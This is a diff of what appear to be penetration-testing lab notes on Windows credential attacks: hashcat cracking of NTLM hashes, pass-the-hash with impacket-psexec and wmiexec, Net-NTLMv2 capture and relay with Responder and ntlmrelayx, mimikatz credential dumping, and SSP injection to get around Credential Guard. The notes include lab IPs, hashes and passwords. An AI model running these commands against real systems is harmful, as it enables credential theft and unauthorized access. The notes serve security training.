@@ -716,7 +716,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     - NTLM hash of user nelly in nelly.hash  `nano nelly.hash` 3ae8e5f0ffabb3a627672e1600f1ba10
     - Hashcat mode for NTLM hashes
       `hashcat --help | grep -i "ntlm"` >  1000 | NTLM  | Operating System
-    - Crack by using rockyou.txt and best64.rule
+    - Crack by using rockyou.txt and best64.rule  
       `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
   - **Passing NTLM**
     - pass-the-hash (PtH) technique: authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password
@@ -735,7 +735,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     - **smbclient** with NTLM hash  
       `smbclient \\\\192.168.139.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`  
       `smb: \> get secrets.txt`  
-    - **psexec** to get an interactive shell
+    - **psexec** to get an interactive shell  
       `impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`
       `C:\Windows\system32> hostname`
   - **Cracking Net-NTLMv2**
@@ -748,9 +748,9 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
       5. Server → Client: Access Granted or ❌ Access Denied
     - [Responder](https://github.com/lgandx/Responder): prints all captured NTLMv2 hashes
     - set up Responder on our Kali machine as an SMB server and use FILES01 (at 192.168.139.211) as the target
-      `nc 192.168.139.211 4444`
-      `whoami` > files01\paul
-      `net user paul` > Remote Desktop Users
+      `nc 192.168.139.211 4444`  
+      `whoami` > files01\paul  
+      `net user paul` > Remote Desktop Users  
     - don't have privileges to run Mimikatz but can set up an SMB server with Responder on Kali, then connect it with user paul and crack NTLMv2 hash
     - Starting Responder on interface tap0 > SMB server is active
       ```
@@ -773,7 +773,6 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
       ```
    - RDP as paul `xfreerdp3 /u:paul /p:123Password123 /v:192.168.139.211 /cert:ignore /drive:share,/home/kali/share`
   - **Relaying Net-NTLMv2**
-    - sudo ip l s dev tun0 mtu 1250  
     - bind shell to create an SMB connection to Kali > forward to another target (UAC disabled)
     - [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py): setting up SMB server and relaying authentication
     - Starting ntlmrelayx for a Relay-attack targeting FILES02  
@@ -797,12 +796,12 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     - Incoming reverse shell successfully > `hostname`  > nt authority\system  
     - `cd "C:\Users\files02admin\Desktop"`
 - **Windows credential guard**  
-   - Logging in to the **CLIENTWK248** machine as a **Domain Administrator**
+   - Logging in to the **CLIENTWK248** machine as a **Domain Administrator**  
      `xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.133.248 /dynamic-resolution` > sign out of administrator  
-   - Logging in to the **CLIENTWK246** as offsec, which is a **local administrator**
+   - Logging in to the **CLIENTWK246** as offsec, which is a **local administrator**  
      `xfreerdp3 /u:"offsec" /p:"lab" /v:192.168.133.246 /dynamic-resolution`
-   - Run terminal as Administrator > cd C:\tools\mimikatz\ > .\mimikatz.exe  
-   - Enable SeDebugPrivilege for our local user and then dump all the available credentials with sekurlsa::logonpasswords
+   - Run terminal as Administrator > cd C:\tools\mimikatz\ > .\mimikatz.exe   
+   - Enable SeDebugPrivilege for our local user and then dump all the available credentials with sekurlsa::logonpasswords  
      ```
      privilege::debug
      sekurlsa::logonpasswords
@@ -811,14 +810,14 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
      NTLM 246 local admin (offsec): 2892d26cdf84d7a70e2eb3b9f05c425e
      NTLM 248 domain admin (administrator): 160c0b16dd0ee77e7c494e38252f7ddf
      ```
-   - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)
+   - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)  
      `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`
-   - **Circumvented Credential Guard by injecting SSP through Mimikatz**
+   - **Circumvented Credential Guard by injecting SSP through Mimikatz**  
      - Credential Guard is only designed to protect non-local users  
-     - Logging in to the CLIENTWK245 machine as a Domain Administrator that has credential guard
-     - Logging in to the CLIENTWK245 machine as a local adminstrator
-     - windows terminal run as administrator > Get-ComputerInfo > hashes encrypted
-     - Injecting a malicious SSP using Mimikatz
+     - Logging in to the CLIENTWK245 machine as a Domain Administrator that has credential guard  
+     - Logging in to the CLIENTWK245 machine as a local adminstrator  
+     - windows terminal run as administrator > Get-ComputerInfo > hashes encrypted  
+     - Injecting a malicious SSP using Mimikatz  
        ```
        privilege::debug
        misc::memssp
